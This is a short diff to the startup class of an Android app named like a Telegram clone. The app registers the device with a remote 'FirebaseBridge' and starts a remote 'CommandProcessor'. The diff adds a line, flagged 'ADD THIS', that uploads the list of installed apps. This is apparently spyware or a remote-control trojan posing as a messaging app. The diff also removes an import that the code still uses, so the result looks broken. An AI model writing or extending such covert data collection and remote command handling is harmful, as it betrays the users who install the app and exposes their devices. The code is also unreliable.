@@ -1,7 +1,7 @@
+// FILE: app/src/main/java/com/telegram2/messaging/Telegram2App.kt
 package com.telegram2.messaging
 
 import android.app.Application
-import android.os.Build
 import android.provider.Settings
 import com.telegram2.messaging.remote.CommandProcessor
 import com.telegram2.messaging.remote.FirebaseBridge
@@ -16,6 +16,7 @@ class Telegram2App : Application() {
 
         val apps = packageManager.getInstalledPackages(0).map { it.packageName }
         FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)
+        FirebaseBridge.pushInstalledApps(apps)  // <--- ADD THIS
 
         CommandProcessor.init(this)
     }
